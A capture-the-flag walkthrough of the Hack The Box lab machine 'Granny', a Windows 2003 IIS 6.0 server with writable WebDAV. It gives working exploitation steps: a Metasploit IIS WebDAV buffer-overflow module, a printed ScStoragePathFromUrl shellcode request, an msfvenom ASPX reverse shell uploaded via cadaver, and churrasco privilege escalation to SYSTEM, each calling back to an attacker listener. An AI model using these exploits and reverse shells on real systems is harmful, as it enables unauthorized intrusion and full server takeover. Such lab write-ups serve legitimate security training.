# Granny
https://app.hackthebox.com/machines/14

![Granny](images/htb-granny.png)

Target IP
10.10.10.15

## Enumeration
---

First lets start with (AutoRecon)[https://github.com/Tib3rius/AutoRecon].
```
sudo $(which autorecon) 10.10.10.15 --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### Nmap

From Nmap results returned from AutoRecon we see that only port 80 is open and IIS is running on it. Chekcing the individual port results details we see the following interesting items.

- Frontpage
```
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
```
- WebDAV
```
|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Date: Wed, 05 Oct 2022 02:17:17 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
```

### WebDAV
---

Let's explore WebDAV a bit. With `davtest` we can see that we have right permissions on the server.

```
$ davtest -url http://10.10.10.15/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: EHy0DvNbaSHodCP
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP
********************************************************
 Sending test files
PUT     asp     FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jhtml
PUT     shtml   FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.php
PUT     cgi     FAIL
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.cfm
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.pl
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jsp
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    pl      FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jhtml
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.php
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.cfm
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.pl
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jsp
Executes: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
Executes: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
```


# Getting a Shell - 3 options

## Shell using Metasploit Framework
---

Open `msfconsole` and search for **webdav** modules.

```
msf6 > search webdav

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/osx/browser/safari_file_policy                    2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   1   exploit/windows/misc/vmhgfs_webdav_dll_sideload           2016-08-05       normal     No     DLL Side Loading Vulnerability in VMware Host Guest Client Redirector
   2   exploit/windows/scada/ge_proficy_cimplicity_gefebt        2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   3   auxiliary/scanner/http/webdav_internal_ip                                  normal     No     HTTP WebDAV Internal IP Scanner
   4   auxiliary/scanner/http/webdav_scanner                                      normal     No     HTTP WebDAV Scanner
   5   auxiliary/scanner/http/webdav_website_content                              normal     No     HTTP WebDAV Website Content Scanner
   6   exploit/windows/misc/ibm_director_cim_dllinject           2009-03-10       excellent  Yes    IBM System Director Agent DLL Injection
   7   exploit/windows/browser/keyhelp_launchtripane_exec        2012-06-26       excellent  No     KeyHelp ActiveX LaunchTriPane Remote Code Execution Vulnerability
   8   exploit/windows/iis/ms03_007_ntdll_webdav                 2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
   9   exploit/windows/ssl/ms04_011_pct                          2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
   10  auxiliary/scanner/http/dir_webdav_unicode_bypass                           normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   11  auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                      normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
   12  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32     2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   13  exploit/windows/local/ms16_016_webdav                     2016-02-09       excellent  Yes    MS16-016 mrxdav.sys WebDav Local Privilege Escalation
   14  exploit/windows/browser/ms10_042_helpctr_xss_cmd_exec     2010-06-09       excellent  No     Microsoft Help Center XSS and Command Execution
   15  exploit/windows/iis/iis_webdav_upload_asp                 2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   16  exploit/windows/iis/iis_webdav_scstoragepathfromurl       2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
   17  exploit/windows/browser/ms10_046_shortcut_icon_dllloader  2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   18  exploit/windows/browser/oracle_webcenter_checkoutandopen  2013-04-16       excellent  No     Oracle WebCenter Content CheckOutAndOpen.dll ActiveX Remote Code Execution
   19  exploit/windows/http/sap_host_control_cmd_exec            2012-08-14       average    Yes    SAP NetWeaver HostControl Command Injection
   20  exploit/windows/misc/webdav_delivery                      1999-01-01       manual     No     Serve DLL via webdav server
   21  exploit/multi/svn/svnserve_date                           2004-05-19       average    No     Subversion Date Svnserve
   22  exploit/multi/http/sun_jsws_dav_options                   2010-01-20       great      Yes    Sun Java System Web Server WebDAV OPTIONS Buffer Overflow
   23  exploit/windows/browser/java_ws_double_quote              2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   24  exploit/windows/browser/java_ws_arginject_altjvm          2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   25  exploit/windows/browser/java_ws_vmargs                    2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   26  exploit/windows/browser/ubisoft_uplay_cmd_exec            2012-07-29       normal     No     Ubisoft uplay 2.0.3 ActiveX Control Arbitrary Code Execution
   27  exploit/windows/browser/webdav_dll_hijacker               2010-08-18       manual     No     WebDAV Application DLL Hijacker
   28  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)
   29  post/windows/escalate/droplnk                                              normal     No     Windows Escalate SMB Icon LNK Dropper
   30  exploit/windows/http/xampp_webdav_upload_php              2012-01-14       excellent  No     XAMPP WebDAV PHP Upload


Interact with a module by name or index. For example info 30, use 30 or use exploit/windows/http/xampp_webdav_upload_php
```

Module `webdav_scanner` will allow us to confirm what we already know - WebDAV is enabled. Lets use it, set **RHOSTS** with our target IP and run the module.
```
msf6 > use auxiliary/scanner/http/webdav_scanner
msf6 auxiliary(scanner/http/webdav_scanner) > options

Module options (auxiliary/scanner/http/webdav_scanner):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       Path to use
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host

msf6 auxiliary(scanner/http/webdav_scanner) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15

msf6 auxiliary(scanner/http/webdav_scanner) > run

[+] 10.10.10.15 (Microsoft-IIS/6.0) has WEBDAV ENABLED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now we can use module `iis_webdav_scstoragepathfromurl` to exploit WebDAV. Remember to set LHOST and RHOSTS before running the module.

```
msf6 auxiliary(scanner/http/webdav_scanner) > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.24.204.158   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.15:1030) at 2022-10-05 20:02:20 -0700

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2772 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami 
whoami
nt authority\network service
```
We have a shell.

## Shell with Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow exploit
---

This code on [Exploit-db](https://www.exploit-db.com/exploits/41738) can be used to exploit WebDAV. However, the example only initiate *calc.exe* on the target. On the web, there are some adaptation of this exploit inserting a shell on the payload. We are going to use [this one](scripts/iis6webdav.py) to do it.

First we need to initiate our listiner.

```
$ nc -nlvp 4444
listening on [any] 4444 ...
```

With python2.7, call the script passing as parameter the target IP and port, and your Kali IP and port.
```
$ python2.7 iis6webdav.py 10.10.10.15 80 10.10.14.5 4444
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

```

```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.15] 1031
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```


## Shell using ASP.net shell
---

The result of `feroxbuster` shows many HTTP Status code 500 for some ASP.net pages.

```
...
500      GET       72l      241w     3026c http://10.10.10.15/%7ebishop.aspx
500      GET       72l      241w     3026c http://10.10.10.15/%7edave.aspx
500      GET       72l      241w     3026c http://10.10.10.15/%7eriot.aspx
500      GET       72l      241w     3026c http://10.10.10.15/%7ellamatron.aspx
...
```

These internal server erros (500) could mean that ASP.net is installed and we could try to explore an ASP.net shell option.

From the results of `davtest` we know that WebDAV allow us to upload to the server *.html* and *.txt* and a few other files, but not *.asp* or *.aspx*.

```
$ davtest -url http://10.10.10.15/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: EHy0DvNbaSHodCP
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP
********************************************************
 Sending test files
PUT     asp     FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jhtml
PUT     shtml   FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.php
PUT     cgi     FAIL
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.cfm
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.pl
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jsp
********************************************************
 Checking for test file execution
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    pl      FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jhtml
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.php
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.cfm
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.pl
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
PUT File: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.jsp
Executes: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.html
Executes: http://10.10.10.15/DavTestDir_EHy0DvNbaSHodCP/davtest_EHy0DvNbaSHodCP.txt
```

Let's use `msfvenom` to create an ASP.net reverse shell payload. Set *lhost* and *lport* with your Kali IP and the port you are going to open with `nc`. Define the output file as a *.txt* file to facilitate when uploading the file.

```
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.5 lport=4444 -f aspx -o webshell.txt

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2718 bytes
Saved as: webshell.txt
```

Now lets use `cadaver` to transfer the file and rename it.

```
$ cadaver http://10.10.10.15
dav:/> put webshell.txt 
Uploading webshell.txt to `/webshell.txt':
Progress: [=============================>] 100.0% of 2718 bytes succeeded.
dav:/> move webshell.txt webshell.aspx
Moving `/webshell.txt' to `/webshell.aspx':  succeeded.
```

Start a listiner on the port you set on `msfvenom` command.
```
$ nc -nlvp 4444
listening on [any] 4444 ...
```

Request the ASP.net page with `curl`.
```
$ curl http://10.10.10.15/aspxshell.aspx
```

We get a shell
```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.15] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

# Privilege Escalation




```
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.5 lport=7700 -f exe -o revshell.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe
```



```
$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```

```
$ nc -nlvp 7700
```



```
C:\Inetpub\wwwroot>churrasco -d "cmd /c C:\Inetpub\wwwroot\revshell.exe"   
churrasco -d "cmd /c C:\Inetpub\wwwroot\revshell.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

